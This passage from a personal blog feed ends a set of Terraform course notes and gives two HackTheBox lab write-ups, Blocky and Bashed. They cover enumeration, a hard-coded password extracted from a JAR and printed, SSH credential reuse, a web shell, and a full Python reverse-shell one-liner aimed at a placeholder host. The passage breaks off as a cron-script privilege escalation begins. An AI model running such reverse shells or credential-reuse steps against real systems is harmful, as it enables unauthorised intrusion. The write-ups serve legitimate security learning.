&lt;p&gt;You can also specify a read-only remote store directly in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.tf&lt;/code&gt; files.  These are called a &lt;em&gt;datasource&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;terraform-variables&quot;&gt;Terraform Variables&lt;/h2&gt;

&lt;p&gt;Terraform variables were completely re-worked in 0.12 release.&lt;/p&gt;

&lt;h3 id=&quot;simple-types&quot;&gt;Simple Types&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;String&lt;/li&gt;
  &lt;li&gt;Number&lt;/li&gt;
  &lt;li&gt;Bool&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;complex-types&quot;&gt;Complex Types&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;List&lt;/li&gt;
  &lt;li&gt;Set&lt;/li&gt;
  &lt;li&gt;Map&lt;/li&gt;
  &lt;li&gt;Object&lt;/li&gt;
  &lt;li&gt;Tuple&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;list&quot;&gt;List&lt;/h4&gt;

&lt;p&gt;Lists are always ordered.&lt;/p&gt;

&lt;p&gt;Referencing: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myvar[0]&lt;/code&gt; index number&lt;/p&gt;

&lt;h4 id=&quot;set&quot;&gt;Set&lt;/h4&gt;

&lt;p&gt;Like a list, but always unique values and does not maintain order, ie. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[5,1,2,2,5] == [1,2,5]&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;map&quot;&gt;Map&lt;/h4&gt;

&lt;p&gt;Like a dictionary (key/value).&lt;br /&gt;
Referencing: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myvar['key']&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;object&quot;&gt;Object&lt;/h4&gt;

&lt;p&gt;Like a map, but each element can have a different type. First is string, second is number.&lt;/p&gt;

&lt;div class=&quot;language-hcl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
&lt;span class=&quot;nx&quot;&gt;firstname&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Bob&quot;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;housenumber&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;tuple&quot;&gt;Tuple&lt;/h4&gt;

&lt;p&gt;Like a list, but each element can have a different type.  First is string, second is boolean, third is number.&lt;br /&gt;
ie. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[&quot;test&quot;, false, 0]&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;other-variable-notes&quot;&gt;Other Variable Notes&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Variables that are declared in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vars.tf&lt;/code&gt; but not defined will need to be defined in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform.tfvars&lt;/code&gt; file.&lt;/li&gt;
  &lt;li&gt;Best practice to NOT commit .tfvars files to repositories.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>wittr</name></author><category term="tools" /><summary type="html">Below are notes I took a few months ago when doing a Udemy Terraform course. I may update them over time as I learn more. Terraform commands Plan Apply Destroy Plan Plan is used to preview changes to the infrastructure. Use: terraform plan for output stdin, or in practice teraform plan -out &amp;lt;file&amp;gt; The file is used in apply. Apply Makes changes to the infrastructure. Destroy Removes all infrastucture defined in plan files. Be careful in production! Terraform State Terraform keeps the remote state of the infrastructure. It stores it in a file called terraform.tfstate. There’s also a backup of the previous state (.backup). If you run terraform apply after terminating an instance (or any defined node etc.) manually, Terraform will re-create it if it is part of the configuration. The state file can be put into version control to see history of the infrastructure (JSON file). Allows for collaboration (beware of conflicts). Large projects require storage of state in a remote repository. Best not to have giant state files. Remote Storage This is called the backend. S3 Consul Terraform enterprise Benefits Allows for collaboration, always available to the whole team. Sensitive information is not stored locally. Enhanced backends allow for remote operations. Avoid having to push the terraform.tfstate to version control. Cautions Not all remote stores support locking. S3 and Consul do. Example Configuration terraform { backend &quot;s3&quot; { bucket = &quot;bucket&quot; key = &quot;terraform/myproject&quot; region = &quot;us-west-1&quot; } } Other State Information You can also specify a read-only remote store directly in .tf files. These are called a datasource. Terraform Variables Terraform variables were completely re-worked in 0.12 release. Simple Types String Number Bool Complex Types List Set Map Object Tuple List Lists are always ordered. Referencing: myvar[0] index number Set Like a list, but always unique values and does not maintain order, ie. [5,1,2,2,5] == [1,2,5] Map Like a dictionary (key/value). Referencing: myvar['key'] Object Like a map, but each element can have a different type. First is string, second is number. { firstname = &quot;Bob&quot; housenumber = 100 } Tuple Like a list, but each element can have a different type. First is string, second is boolean, third is number. ie. [&quot;test&quot;, false, 0] Other Variable Notes Variables that are declared in vars.tf but not defined will need to be defined in the terraform.tfvars file. Best practice to NOT commit .tfvars files to repositories.</summary></entry><entry><title type="html">HackTheBox - Blocky</title><link href="/writeups/todo/2020/07/14/HTB-Blocky.html" rel="alternate" type="text/html" title="HackTheBox - Blocky" /><published>2020-07-14T00:05:00-05:00</published><updated>2020-07-14T00:05:00-05:00</updated><id>/writeups/todo/2020/07/14/HTB-Blocky</id><content type="html" xml:base="/writeups/todo/2020/07/14/HTB-Blocky.html">&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Blocky/Blocky.png&quot; alt=&quot;Blocky&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;Blocky is a box that is meant to teach bad password practices, decompiling JAR files, and the perils of exposing internal files on public websites.  I first enumerate with nmap to find SSH and HTTP open as well as some other ports that ended up not being paths to follow.  I then enumerated the website’s directories in order to find some java code that exposed credentials.  Those credentials were reused and were used to gain a foothold.  Due to excessive privileges assigned to the normal user, I was able to easily escalate to root immediately after gaining a foothold.&lt;/p&gt;

&lt;h2 id=&quot;walkthrough&quot;&gt;Walkthrough&lt;/h2&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;As usual, I started with nmap to scan the machine.  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -A -T4 -v -p1-30000 10.10.10.37&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE  SERVICE   VERSION  
21/tcp    open   ftp       ProFTPD 1.3.5a  
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
80/tcp    open   http      Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;  
8192/tcp  closed sophos  
25565/tcp open   minecraft Minecraft 1.11.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Protocol: 127, Message: A Minecraft Server, Users: 0/20&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;FTP doesn’t have anonymous access allowed, so I decided to checkout the webserver.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Blocky/blockycraft.png&quot; alt=&quot;Blockycraft&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; against the site, looking for subdirectories.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.37 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://10.10.10.37
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2020/07/13 22:11:18 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/wiki &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/wp-content &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/plugins &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/wp-includes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/javascript &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/wp-admin &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/phpmyadmin &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At about 40% I decided to stop the scan and look at what I found so far.  In particular &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/plugins&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/phpmyadmin&lt;/code&gt; caught my eye. Attempting defaults root/password or root/null on PHPMyAdmin did nothing so I looked at plugins instead.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/plugins&lt;/code&gt; page had a couple jar files listed that I could download.&lt;/p&gt;

&lt;p&gt;I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; against the jar files quick and found one of them seemed to have references to “my first plugin” so I figured this is the interesting one.&lt;/p&gt;

&lt;p&gt;I unzipped the jar file and went to open the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com/myfirstplugin/BlockyCore.class&lt;/code&gt; file.  It was clearly not plaintext so I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings BlockyCore.class&lt;/code&gt; and noticed a root user followed by its password on the next line:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;--snipped--&lt;/span&gt;
&amp;lt;init&amp;gt;
Code
        localhost
root
8YsqfCTnvxAUeduzjNSXe22 
LineNumberTable
LocalVariableTable
&lt;span class=&quot;nt&quot;&gt;--snipped--&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I went back to the PHPMyAdmin console and saw the username / password combo worked.  However, I like to double check my path with the official walkthroughs of HTB because time is limited for me. I noticed it alludes to using JD-GUI to decompile the plugin. So I decided to try this out and get the experience since I haven’t done it before.&lt;/p&gt;

&lt;p&gt;On my Kali box I looked for JD-GUI but didn’t see it.  I did see &lt;a href=&quot;https://github.com/skylot/jadx&quot;&gt;JaDx-GUI&lt;/a&gt; available so I opened that and opened the jar file.  Sure enough the credentials are hard-coded.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Blocky/blockyjar.png&quot; alt=&quot;blockyjar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After looking at the PHPMyAdmin console for a bit I saw there was a wordpress user named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notch&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Blocky/wpusers.png&quot; alt=&quot;wordpress&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;foothold&quot;&gt;Foothold&lt;/h3&gt;

&lt;p&gt;I couldn’t find any clear path to Foothold with an exploit etc. so I decided to take another peak at the official walkthrough.  It looked like there was a complex path (marked &lt;strong&gt;todo&lt;/strong&gt; for later) that involved PHPMyAdmin and an easier path.  Cue the facepalm, as I forgot to try the credentials on the other services I found earlier with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I logged into the box via SSH with the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notch&lt;/code&gt; I found above in Wordpress users, using the same password found from the jar file.&lt;/p&gt;

&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;

&lt;p&gt;I didn’t need to pivot to any other user, so I just grabbed the user.txt string from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/notch&lt;/code&gt; and started enumerating.  I &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp&lt;/code&gt;‘d over an enumeration script and ran it (LinEnum) but honestly, it wasn’t needed.  I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; and noticed I had access to ALL commands.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;notch@Blocky:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;notch: 
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;notch on Blocky:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User notch may run the following commands on Blocky:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;root&quot;&gt;Root&lt;/h3&gt;

&lt;p&gt;Given that notch is essentially an administrator, I just ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -i&lt;/code&gt; and got a root shell, then went and grabbed the root.txt.&lt;/p&gt;

&lt;h3 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h3&gt;

&lt;p&gt;The main thing I learned on this box was a different way of accessing jar files using tools that decompile them.  In this case, &lt;em&gt;JaDx-GUI&lt;/em&gt;.  Overall a pretty simple yet entertaining box and I’m logging off for the evening feeling satisified.&lt;/p&gt;

&lt;p&gt;I realized I keep capturing my mouse cursor in screenshots, so I’ll try to avoid that next time.&lt;/p&gt;</content><author><name>wittr</name></author><category term="writeups" /><category term="todo" /><summary type="html">Summary Blocky is a box that is meant to teach bad password practices, decompiling JAR files, and the perils of exposing internal files on public websites. I first enumerate with nmap to find SSH and HTTP open as well as some other ports that ended up not being paths to follow. I then enumerated the website’s directories in order to find some java code that exposed credentials. Those credentials were reused and were used to gain a foothold. Due to excessive privileges assigned to the normal user, I was able to easily escalate to root immediately after gaining a foothold. Walkthrough Enumeration As usual, I started with nmap to scan the machine. nmap -A -T4 -v -p1-30000 10.10.10.37 PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 8192/tcp closed sophos 25565/tcp open minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20) FTP doesn’t have anonymous access allowed, so I decided to checkout the webserver. I ran gobuster against the site, looking for subdirectories. gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.37 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/07/13 22:11:18 Starting gobuster =============================================================== /wiki (Status: 301) /wp-content (Status: 301) /plugins (Status: 301) /wp-includes (Status: 301) /javascript (Status: 301) /wp-admin (Status: 301) /phpmyadmin (Status: 301) At about 40% I decided to stop the scan and look at what I found so far. In particular /plugins and /phpmyadmin caught my eye. Attempting defaults root/password or root/null on PHPMyAdmin did nothing so I looked at plugins instead. The /plugins page had a couple jar files listed that I could download. I ran strings against the jar files quick and found one of them seemed to have references to “my first plugin” so I figured this is the interesting one. I unzipped the jar file and went to open the com/myfirstplugin/BlockyCore.class file. It was clearly not plaintext so I ran strings BlockyCore.class and noticed a root user followed by its password on the next line: --snipped-- &amp;lt;init&amp;gt; Code localhost root 8YsqfCTnvxAUeduzjNSXe22 LineNumberTable LocalVariableTable --snipped-- I went back to the PHPMyAdmin console and saw the username / password combo worked. However, I like to double check my path with the official walkthroughs of HTB because time is limited for me. I noticed it alludes to using JD-GUI to decompile the plugin. So I decided to try this out and get the experience since I haven’t done it before. On my Kali box I looked for JD-GUI but didn’t see it. I did see JaDx-GUI available so I opened that and opened the jar file. Sure enough the credentials are hard-coded. After looking at the PHPMyAdmin console for a bit I saw there was a wordpress user named notch.</summary></entry><entry><title type="html">HackTheBox - Bashed</title><link href="/writeups/2020/07/08/HTB-Bashed.html" rel="alternate" type="text/html" title="HackTheBox - Bashed" /><published>2020-07-08T22:24:00-05:00</published><updated>2020-07-08T22:24:00-05:00</updated><id>/writeups/2020/07/08/HTB-Bashed</id><content type="html" xml:base="/writeups/2020/07/08/HTB-Bashed.html">&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Bashed/Bashed.png&quot; alt=&quot;Bashed&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;This was a box that mainly involved scanning the web server for interesting items and then gaining foothold via a php webshell called phpbash.  Privilege escalation was a good exercise in not overcomplicating python code.&lt;/p&gt;

&lt;h2 id=&quot;walkthrough&quot;&gt;Walkthrough&lt;/h2&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Started with the usual nmap scan of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -T4 -A -v 10.10.10.68&lt;/code&gt;.  Only thing found was a webserver so I looked at the webserver.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Bashed/Bashed-website.png&quot; alt=&quot;phpbash webpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I decided to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirb&lt;/code&gt; as I have used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; before but not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirb&lt;/code&gt; so it ws a chance to get familiar with the tool. It seems to have its default wordlisting for directories and that worked here.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dirb http:///10.10.10.68

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
DIRB v2.22
By The Dark Raver
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

START_TIME: Tue Jul  7 22:41:29 2020
URL_BASE: http:///10.10.10.68/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

GENERATED WORDS: 4612

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http:///10.10.10.68/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http:///10.10.10.68/css &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:308&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http:///10.10.10.68/dev &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301SIZE:308&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http:///10.10.10.68/fonts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:310&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http:///10.10.10.68/images &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:311&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http:///10.10.10.68/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:7743&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http:///10.10.10.68/js &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:307&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
+ http:///10.10.10.68/php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:308&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http:///10.10.10.68/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:299&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http:///10.10.10.68/uploads &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:312&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
END_TIME: Tue Jul  7 22:45:06 2020
DOWNLOADED: 4612 - FOUND: 9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The noticable thing here that leads to something is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev&lt;/code&gt;.  Browsing to it shows us that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpbash&lt;/code&gt; is indeed available for use.  So browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.68/dev/phpbash.php&lt;/code&gt; gave me a webshell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Bashed/phpbash-webshell.png&quot; alt=&quot;phpbash&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;foothold&quot;&gt;Foothold&lt;/h3&gt;

&lt;p&gt;I had issues trying to figure out how to use phpbash to get a reverse shell.  The usual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; command wasn’t working, and the usual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfifo&lt;/code&gt; one-liner workaround didn’t work inside the webshell.  Also noticed perl and a few others weren’t available as well.  For me only a python reverse shell one-liner worked:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&amp;lt;IP&amp;gt;&quot;,&amp;lt;port&amp;gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After getting a shell, I upgraded it with the standard python command:&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Immediately after doing this I was getting an echo of each character
&lt;em&gt;lliikkee tthhiiss&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;So I did a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CTRL+Z&lt;/code&gt; to the background and ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stty raw -echo&lt;/code&gt; followed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fg&lt;/code&gt; to get my shell back, and the echo was gone.&lt;/p&gt;

&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;

&lt;p&gt;I immediately went to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home&lt;/code&gt; and noticed that arrexel’s user folder had world readable permissions on the user.txt file. I was able to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; it easily as the www-data user.&lt;/p&gt;

&lt;h3 id=&quot;root&quot;&gt;Root&lt;/h3&gt;

&lt;p&gt;Looking around the filesystem (and a peek at the official HTB walkthrough cause honestly, I have to be effective with my time at this point in my life) we see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/scripts&lt;/code&gt; root directory is owned by the &lt;em&gt;scriptmanager&lt;/em&gt; user.&lt;/p&gt;

&lt;p&gt;Checking out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; options we see that we can run anything as this &lt;em&gt;scriptmanager&lt;/em&gt; user so I grab a shell as the user via this command:
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -u scriptmanager /bin/bash&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Moving into the interesting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/scripts&lt;/code&gt; directory we see a couple files: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt; file seems to update its timestamp every minute or so and is owned by &lt;em&gt;root&lt;/em&gt;.  Looking at the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt; we can see why - it is simply putting text into the txt file when it executes.  &lt;em&gt;root&lt;/em&gt; must be executing it since it is the owner of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Now that I had write access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt; file, I just needed to write some python code to give me a reverse shell.  I did some Googling and discovered this is as easy as just using native python os lib.&lt;/p&gt;

